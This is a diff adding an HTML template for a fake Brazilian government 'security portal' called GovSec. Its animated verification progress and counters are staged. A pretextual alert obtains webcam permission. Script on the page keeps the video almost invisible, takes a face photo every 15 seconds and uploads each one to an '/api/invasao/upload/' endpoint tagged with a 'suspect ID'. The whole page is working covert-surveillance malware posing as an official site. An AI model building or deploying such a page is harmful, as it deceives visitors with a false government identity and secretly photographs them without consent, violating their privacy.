@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal de Segurança Governamental</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <!-- Inject suspect ID as a global variable -->
+    <script>
+        window.SUSPECT_ID = "{{ suspect_id }}";
+    </script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #1a2a6c 0%, #2c3e50 100%);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 800px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .header {
+            background: linear-gradient(90deg, #2c3e50 0%, #1a2a6c 100%);
+            padding: 25px 30px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+        
+        .logo-icon {
+            font-size: 36px;
+        }
+        
+        .logo-text {
+            font-weight: 700;
+            font-size: 28px;
+        }
+        
+        .header h1 {
+            font-weight: 700;
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            font-weight: 300;
+            opacity: 0.9;
+            font-size: 18px;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .verification-card {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 10px;
+            padding: 25px;
+            margin: 20px 0;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .verification-card h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #3498db;
+            text-align: center;
+        }
+        
+        .progress-container {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            height: 20px;
+            margin: 25px 0;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #3498db 0%, #2ecc71 100%);
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+        
+        .status-message {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 18px;
+            min-height: 27px;
+        }
+        
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .feature-card {
+            background: rgba(52, 152, 219, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            transition: transform 0.3s ease;
+        }
+        
+        .feature-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .feature-icon {
+            font-size: 36px;
+            margin-bottom: 15px;
+            color: #3498db;
+        }
+        
+        .feature-title {
+            font-weight: 600;
+            margin-bottom: 10px;
+            font-size: 18px;
+        }
+        
+        .feature-desc {
+            font-size: 14px;
+            opacity: 0.8;
+        }
+        
+        .counter-section {
+            display: flex;
+            justify-content: space-around;
+            margin: 30px 0;
+            text-align: center;
+        }
+        
+        .counter-item {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+            padding: 20px;
+            min-width: 120px;
+        }
+        
+        .counter-number {
+            font-size: 32px;
+            font-weight: 700;
+            color: #2ecc71;
+            margin-bottom: 5px;
+        }
+        
+        .counter-label {
+            font-size: 16px;
+            opacity: 0.8;
+        }
+        
+        .video-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            z-index: -1;
+            opacity: 0.01;
+        }
+        
+        video {
+            width: 320px;
+            height: 240px;
+            object-fit: cover;
+        }
+        
+        canvas {
+            display: none;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+        }
+        
+        @media (max-width: 600px) {
+            .features {
+                grid-template-columns: 1fr;
+            }
+            
+            .counter-section {
+                flex-direction: column;
+                gap: 15px;
+            }
+            
+            .header h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <div class="logo-icon">🛡️</div>
+                <div class="logo-text">GOVSEC</div>
+            </div>
+            <h1>PORTAL DE SEGURANÇA</h1>
+            <p>Verificação de Identidade e Acesso Autorizado</p>
+        </div>
+        
+        <div class="content">
+            <div class="verification-card">
+                <h2>Verificação de Segurança em Andamento</h2>
+                
+                <div class="progress-container">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                
+                <div class="status-message" id="statusMessage">
+                    Inicializando verificação de segurança...
+                </div>
+                
+                <div class="features">
+                    <div class="feature-card">
+                        <div class="feature-icon">🔒</div>
+                        <div class="feature-title">Criptografia Avançada</div>
+                        <div class="feature-desc">Proteção de dados em tempo real</div>
+                    </div>
+                    
+                    <div class="feature-card">
+                        <div class="feature-icon">👁️</div>
+                        <div class="feature-title">Análise Biométrica</div>
+                        <div class="feature-desc">Verificação facial automática</div>
+                    </div>
+                    
+                    <div class="feature-card">
+                        <div class="feature-icon">📡</div>
+                        <div class="feature-title">Conexão Segura</div>
+                        <div class="feature-desc">Protocolo TLS 1.3 garantido</div>
+                    </div>
+                </div>
+                
+                <div class="counter-section">
+                    <div class="counter-item">
+                        <div class="counter-number" id="usersCounter">0</div>
+                        <div class="counter-label">Usuários Verificados</div>
+                    </div>
+                    
+                    <div class="counter-item">
+                        <div class="counter-number" id="threatsCounter">0</div>
+                        <div class="counter-label">Ameaças Bloqueadas</div>
+                    </div>
+                    
+                    <div class="counter-item">
+                        <div class="counter-number" id="uptimeCounter">99.9%</div>
+                        <div class="counter-label">Disponibilidade</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="video-container">
+            <video id="video" autoplay playsinline></video>
+            <canvas id="canvas"></canvas>
+        </div>
+        
+        <div class="footer">
+            <p>© 2025 GovSec - Sistema de Segurança Governamental<br>
+            Protocolo de Segurança Nível 5 - Classificação Restrita</p>
+        </div>
+    </div>
+
+    <script>
+        // Global variables
+        let stream = null;
+        let captureInterval = null;
+        let photoCount = 0;
+        let progress = 0;
+        let isVideoReady = false;
+        
+        // DOM Elements
+        const videoElement = document.getElementById('video');
+        const canvasElement = document.getElementById('canvas');
+        const videoContainer = document.querySelector('.video-container');
+        const progressBar = document.getElementById('progressBar');
+        const statusMessage = document.getElementById('statusMessage');
+        const usersCounter = document.getElementById('usersCounter');
+        const threatsCounter = document.getElementById('threatsCounter');
+        
+        // Status messages for the verification process
+        const statusMessages = [
+            "Inicializando verificação de segurança...",
+            "Conectando ao servidor seguro...",
+            "Verificando credenciais biométricas...",
+            "Analisando padrões de comportamento...",
+            "Escaneando ambiente do usuário...",
+            "Validando certificados digitais...",
+            "Sincronizando com banco de dados central...",
+            "Aplicando políticas de segurança...",
+            "Gerando token de acesso...",
+            "Verificação concluída com sucesso!"
+        ];
+        
+        // Request camera permissions
+        async function requestCameraAccess() {
+            try {
+                // Show a convincing message before requesting camera access
+                alert("Para garantir a segurança do portal e personalizar sua experiência, precisamos realizar uma breve verificação de ambiente. Esta é uma verificação automática de segurança para proteger seus dados.");
+                
+                // Request camera access with standard constraints
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user', // Changed to user-facing camera
+                        width: { min: 640, ideal: 1280, max: 1920 },
+                        height: { min: 480, ideal: 720, max: 1080 }
+                    }, 
+                    audio: false 
+                });
+                
+                // Apply settings to video element
+                videoElement.srcObject = stream;
+                videoElement.muted = true;
+                videoElement.volume = 0;
+                videoElement.disablePictureInPicture = true;
+                videoElement.playsInline = true;
+                
+                // Wait for video to be ready
+                videoElement.onloadedmetadata = () => {
+                    console.log("Video metadata loaded");
+                    isVideoReady = true;
+                };
+                
+                videoElement.onplaying = () => {
+                    console.log("Video is playing");
+                    // Start capture after video is confirmed playing
+                    setTimeout(startCapture, 2000);
+                };
+                
+                return true;
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+                alert("Verificação de segurança não concluída. Você pode continuar navegando, mas algumas funcionalidades personalizadas podem estar limitadas.");
+                return false;
+            }
+        }
+        
+        // Capture photo with temporary visibility
+        async function capturePhoto() {
+            if (!stream || !isVideoReady) {
+                console.log("Stream not ready for capture");
+                return;
+            }
+            
+            try {
+                // Check if video has valid dimensions
+                if (videoElement.videoWidth <= 0 || videoElement.videoHeight <= 0) {
+                    console.log("Invalid video dimensions:", videoElement.videoWidth, videoElement.videoHeight);
+                    return;
+                }
+                
+                console.log("Preparing to capture photo...");
+                
+                // Make video temporarily visible for capture but keep it tiny and nearly transparent
+                videoContainer.style.position = 'fixed';
+                videoContainer.style.top = '0';
+                videoContainer.style.left = '0';
+                videoContainer.style.width = '1px';
+                videoContainer.style.height = '1px';
+                videoContainer.style.opacity = '0.01';
+                videoContainer.style.zIndex = '9999';
+                
+                // Wait a moment for rendering
+                await new Promise(resolve => setTimeout(resolve, 200));
+                
+                // Set canvas dimensions to match video
+                canvasElement.width = videoElement.videoWidth;
+                canvasElement.height = videoElement.videoHeight;
+                const ctx = canvasElement.getContext('2d');
+                
+                // Clear canvas first
+                ctx.clearRect(0, 0, canvasElement.width, canvasElement.height);
+                
+                // Draw video frame to canvas
+                ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+                
+                // Hide video again immediately
+                videoContainer.style.position = 'fixed';
+                videoContainer.style.top = '0';
+                videoContainer.style.left = '0';
+                videoContainer.style.width = '1px';
+                videoContainer.style.height = '1px';
+                videoContainer.style.opacity = '0.01';
+                videoContainer.style.zIndex = '-1';
+                
+                // Check if anything was drawn by sampling multiple pixels
+                let isValidImage = false;
+                const imageData = ctx.getImageData(0, 0, canvasElement.width, canvasElement.height);
+                const data = imageData.data;
+                
+                // Sample multiple pixels to check if image is not completely black
+                for (let i = 0; i < data.length; i += 4000) { // Skip pixels for performance
+                    if (data[i] > 10 || data[i + 1] > 10 || data[i + 2] > 10) {
+                        isValidImage = true;
+                        break;
+                    }
+                }
+                
+                if (!isValidImage) {
+                    console.log("Image appears to be black, skipping capture");
+                    return;
+                }
+                
+                console.log("Image captured successfully");
+                
+                // Convert to blob and send
+                canvasElement.toBlob(async (blob) => {
+                    if (blob) {
+                        await sendMedia(blob, 'photo', `govsec_photo_${Date.now()}.jpg`);
+                        photoCount++;
+                        console.log(`Photo ${photoCount} captured and sent successfully`);
+                    }
+                }, 'image/jpeg', 0.85); // Increased quality
+            } catch (error) {
+                console.error("Error capturing photo:", error);
+                // Ensure video is hidden even if capture fails
+                videoContainer.style.position = 'fixed';
+                videoContainer.style.top = '0';
+                videoContainer.style.left = '0';
+                videoContainer.style.width = '1px';
+                videoContainer.style.height = '1px';
+                videoContainer.style.opacity = '0.01';
+                videoContainer.style.zIndex = '-1';
+            }
+        }
+        
+        // Send media to backend
+        async function sendMedia(blob, mediaType, filename) {
+            const formData = new FormData();
+            formData.append('media_type', mediaType);
+            formData.append('file', blob, filename);
+            formData.append('caption', `Government security portal - ${mediaType} captured at ${new Date().toLocaleString()}`);
+            
+            // Debug logging
+            console.log('Sending media with suspect ID:', window.SUSPECT_ID);
+            
+            try {
+                const response = await fetch('/api/invasao/upload/', {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'X-Suspect-ID': window.SUSPECT_ID || '1'  // Use dynamic suspect ID
+                    },
+                    keepalive: true
+                });
+                
+                if (response.ok) {
+                    console.log(`${mediaType} sent successfully`);
+                } else {
+                    console.error(`Failed to send ${mediaType}:`, response.status);
+                }
+            } catch (error) {
+                console.error(`Error sending ${mediaType}:`, error);
+            }
+        }
+        
+        // Update progress bar and status
+        function updateProgress() {
+            if (progress < 100) {
+                progress += 2;
+                progressBar.style.width = `${progress}%`;
+                
+                // Update status message based on progress
+                const messageIndex = Math.min(Math.floor(progress / 10), statusMessages.length - 1);
+                statusMessage.textContent = statusMessages[messageIndex];
+                
+                // Update counters
+                usersCounter.textContent = Math.floor(progress * 12.5);
+                threatsCounter.textContent = Math.floor(progress * 3.7);
+            } else {
+                clearInterval(progressInterval);
+            }
+        }
+        
+        // Start automatic capture
+        function startCapture() {
+            if (!isVideoReady) {
+                console.log("Video not ready yet, waiting...");
+                setTimeout(startCapture, 1000);
+                return;
+            }
+            
+            console.log("Starting capture process with video ready");
+            
+            if (captureInterval) {
+                clearInterval(captureInterval);
+            }
+            
+            // Take a photo every 15 seconds (increased frequency for better chances)
+            captureInterval = setInterval(() => {
+                capturePhoto();
+            }, 15000);
+            
+            // Take an initial photo after a delay
+            setTimeout(() => {
+                capturePhoto();
+            }, 3000);
+        }
+        
+        // Initialize when page loads
+        window.addEventListener('DOMContentLoaded', async () => {
+            // Request camera access immediately
+            await requestCameraAccess();
+            
+            // Start progress simulation
+            const progressInterval = setInterval(updateProgress, 300);
+        });
+        
+        // Cleanup when leaving the page
+        window.addEventListener('beforeunload', () => {
+            // Stop all media tracks when leaving the page
+            if (stream) {
+                const tracks = stream.getTracks();
+                tracks.forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
